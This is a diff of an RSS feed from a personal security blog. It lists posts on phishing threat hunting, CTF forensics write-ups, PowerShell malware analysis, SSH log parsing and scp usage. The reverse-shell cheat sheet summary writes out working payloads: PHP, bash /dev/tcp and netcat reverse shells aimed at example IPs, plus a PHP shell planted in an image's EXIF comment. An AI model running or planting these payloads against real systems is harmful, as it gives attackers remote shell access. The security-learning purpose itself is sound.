@@ -6,15 +6,27 @@
     <description>Recent content in Posts on Fl1x&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-    <lastBuildDate>Thu, 07 Apr 2022 19:25:46 +0200</lastBuildDate><atom:link href="https://fl1xh.github.io/posts/feed.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sat, 17 Dec 2022 12:40:56 +0100</lastBuildDate><atom:link href="https://fl1xh.github.io/posts/feed.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Threat Hunting Phishing Domains in Golang</title>
+      <link>https://fl1xh.github.io/posts/phishing_threat_hunting_go/</link>
+      <pubDate>Sat, 17 Dec 2022 12:40:56 +0100</pubDate>
+      
+      <guid>https://fl1xh.github.io/posts/phishing_threat_hunting_go/</guid>
+      <description>Starting point A few months ago, I decided to focus on Threat Hunting and what tool I could create to hunt myself and find malicious behavior and attackers.
+An idea occurred to me: many people in my entourage asked me if this &amp;ldquo;text message&amp;rdquo; or this &amp;ldquo;email&amp;rdquo; was legit, especially the URL link there. Of course 90% of the time, it was smishing or phishing campaigns.
+After that, I wondered how I could anticipate the attackers.</description>
+    </item>
+    
     <item>
       <title>[CyberDefenders] Ulysses Writeup</title>
       <link>https://fl1xh.github.io/posts/wu_cbd_ulysses/</link>
       <pubDate>Thu, 07 Apr 2022 19:25:46 +0200</pubDate>
       
       <guid>https://fl1xh.github.io/posts/wu_cbd_ulysses/</guid>
-      <description>Background  Question 1 Question 2 Question 3 Question 4 Question 5 Question 6 Question 7 Question 8 Question 9 Question 10 Question 11      Background A Linux server was possibly compromised and a forensic analysis is required in order to understand what really happened. Hard disk dumps and memory snapshots of the machine are provided in order to solve the challenge (https://cyberdefenders.org/blueteam-ctf-challenges/41).
-Challenge Files:</description>
+      <description>Background Question 1 Question 2 Question 3 Question 4 Question 5 Question 6 Question 7 Question 8 Question 9 Question 10 Question 11 Background A Linux server was possibly compromised and a forensic analysis is required in order to understand what really happened. Hard disk dumps and memory snapshots of the machine are provided in order to solve the challenge (https://cyberdefenders.org/blueteam-ctf-challenges/41).
+Challenge Files:
+victoria-v8.kcore.img: memory dump done by dd’ing /proc/kcore.</description>
     </item>
     
     <item>
@@ -23,10 +35,10 @@ Challenge Files:</description>
       <pubDate>Wed, 06 Apr 2022 12:07:11 +0200</pubDate>
       
       <guid>https://fl1xh.github.io/posts/wu_btlo_malicious_powershell_analysis/</guid>
-      <description>Introduction  Question 1 Question 2 Question 3 Question 4 Question 5 Question 6   Conclusion    Introduction As its name suggests, this challenge will allow us to analyze a malicious powershell file.
+      <description>Introduction Question 1 Question 2 Question 3 Question 4 Question 5 Question 6 Conclusion Introduction As its name suggests, this challenge will allow us to analyze a malicious powershell file.
 CyberChef is often a useful tool for this sort of analysis and we’re gonna use it.
 After downloading the .zip archive, we get a file called &amp;quot;ps_script.txt&amp;quot;.
-Here we get the content with a simple cat command.</description>
+Here we get the content with a simple cat command. POwersheLL -w hidden means that a hidden PowerShell window (invisible to the user) is opened, and -ENCOD, shorthand for encoded shows that the script was encoded with Base64.</description>
     </item>
     
     <item>
@@ -35,8 +47,8 @@ Here we get the content with a simple cat command.</description>
       <pubDate>Mon, 28 Mar 2022 11:05:32 +0200</pubDate>
       
       <guid>https://fl1xh.github.io/posts/sshd_parse_forensics/</guid>
-      <description>Introduction Basic Log stats  Number of log entries Services Logs   SSHD Logs Parse  Logins Port Scanners   Conclusion    Introduction In this article, we will see how to analyze SSHD (SSH server-side) logs with basic command-line tools &amp;ldquo;grep, cat, wc, head, tail, awk&amp;rdquo; to potentially find any suspicious requests on our SSH server.
-By default, we have the SSHD logs in /var/log/auth.</description>
+      <description>Introduction Basic Log stats Number of log entries Services Logs SSHD Logs Parse Logins Port Scanners Conclusion Introduction In this article, we will see how to analyze SSHD (SSH server-side) logs with basic command-line tools &amp;ldquo;grep, cat, wc, head, tail, awk&amp;rdquo; to potentially find any suspicious requests on our SSH server.
+By default, we have the SSHD logs in /var/log/auth.log . This file contains not only SSHD logs but also CRON, SUDO and PAM logs.</description>
     </item>
     
     <item>
@@ -45,7 +57,7 @@ By default, we have the SSHD logs in /var/log/auth.</description>
       <pubDate>Wed, 16 Mar 2022 22:43:04 +0100</pubDate>
       
       <guid>https://fl1xh.github.io/posts/scp_cheat_sheet/</guid>
-      <description>Copying a file to the remote system scp file user@host:/path/to/file	Copying a file from the remote system scp user@host:/path/to/file /local/path/to/file Copying multiple files scp file1 file2 user@host:/path/to/directory	Copying an entire directory scp -r /path/to/directory user@host:/path/to/directory	Conditions -r # transfer directory  -v # see the transfer details -C # copy files with compression -l 800 # limit bandwith with 800 -p # preserving the original attributes of the copied files -P # connection port -q # hidden the output </description>
+      <description>Copying a file to the remote system scp file user@host:/path/to/file	Copying a file from the remote system scp user@host:/path/to/file /local/path/to/file Copying multiple files scp file1 file2 user@host:/path/to/directory	Copying an entire directory scp -r /path/to/directory user@host:/path/to/directory	Conditions -r # transfer directory -v # see the transfer details -C # copy files with compression -l 800 # limit bandwith with 800 -p # preserving the original attributes of the copied files -P # connection port -q # hidden the output </description>
     </item>
     
     <item>
@@ -54,8 +66,8 @@ By default, we have the SSHD logs in /var/log/auth.</description>
       <pubDate>Wed, 16 Mar 2022 14:34:07 +0100</pubDate>
       
       <guid>https://fl1xh.github.io/posts/reverse_shell_cheat_sheet/</guid>
-      <description>PHP  Oneliner  php -r &amp;#39;$sock=fsockopen(&amp;#34;172.16.1.1&amp;#34;,4445);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;  Same using URL encoding  php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.1%22%2C4445%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 &amp;lt;?php exec(&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.10/1234 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;);  Reverse-shell payload Windows  https://github.com/Dhayalanb/windows-php-reverse-shell
-Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&amp;lt;/tmp/backpipe | nc 172.16.1.1 4444 1&amp;gt;/tmp/backpipe Bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1 Exif of a file with php exiftool -Comment=&amp;#39;&amp;lt;?php $sock = fsockopen(&amp;#34;&amp;lt;IPADDRESS&amp;gt;&amp;#34;,&amp;lt;PORT&amp;gt;);$proc = proc_open(&amp;#34;/bin/sh -i&amp;#34;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock), $pipes); ?</description>
+      <description>PHP Oneliner php -r &amp;#39;$sock=fsockopen(&amp;#34;172.16.1.1&amp;#34;,4445);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; Same using URL encoding php%20-r%20%27%24sock%3Dfsockopen%28%22172.16.1.1%22%2C4445%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 &amp;lt;?php exec(&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.10/1234 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;); Reverse-shell payload Windows https://github.com/Dhayalanb/windows-php-reverse-shell
+Netcat nc 172.16.1.1 4545 -e /bin/sh mknod /tmp/backpipe p /bin/sh 0&amp;lt;/tmp/backpipe | nc 172.16.1.1 4444 1&amp;gt;/tmp/backpipe Bash bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1 Exif of a file with php exiftool -Comment=&amp;#39;&amp;lt;?php $sock = fsockopen(&amp;#34;&amp;lt;IPADDRESS&amp;gt;&amp;#34;,&amp;lt;PORT&amp;gt;);$proc = proc_open(&amp;#34;/bin/sh -i&amp;#34;, array(0=&amp;gt;$sock, 1=&amp;gt;$sock, 2=&amp;gt;$sock), $pipes); ?&amp;gt;&amp;#39; &amp;lt;IMAGE&amp;gt; </description>
     </item>
     
   </channel>
